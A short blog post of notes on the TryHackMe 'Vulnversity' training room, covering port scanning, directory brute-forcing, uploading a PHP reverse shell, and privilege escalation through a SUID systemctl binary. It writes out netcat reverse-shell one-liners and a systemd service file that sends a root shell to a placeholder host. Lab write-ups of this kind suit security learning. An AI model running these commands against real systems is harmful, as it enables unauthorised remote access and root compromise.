---
layout: md
title: TryHackMe Vulnversity Room
description: Vulnversity notes & recap
tags: ['security', 'tryhackme']
categories: ['linux', 'security', 'thm']
---

{% include project-headers.html %}

[TryHackMe ~ Vulnversity](https://tryhackme.com/room/vulnversity)

Notes on the beginner challenge, vulnversity. Covers basic recon, web application testing, file inclusion, reverse shells and privilege esculation.  

#### Nmap Recon
Use nmap to scan ports and try to find details about services and versions on those ports 
```bash
nmap -sV -sC <target>
```

#### Finding web routes
Try bruteforce webpages/directories using [gobuster](https://github.com/OJ/gobuster)
```bash
gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

#### Netcat commands
```bash
basic connection:
nc -lvnp 4444 [> /path/to/file.ext]
nc <ip> <port> [< /path/to/file.ext]

reverse shells:
nc -e /bin/bash <ip> <port>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```
#### File inclusion for reverse shell
Upload [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) as `.phtml`, setup a nc listener, load the phtml location.

#### Search for SUID bit
```bash
find / -perm /4000
...
/bin/systemctl
```

#### Privilege esculation
Reverse shell using netcat openbsd from systemctl service.
```bash
[Unit]
Description=root-shell

[Service]
ExecStart=/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f"

[Install]
WantedBy=multi-user.target
```
```bash
/bin/systemctl enable /path/to/root-shell.service
/bin/systemctl start root-shell
```


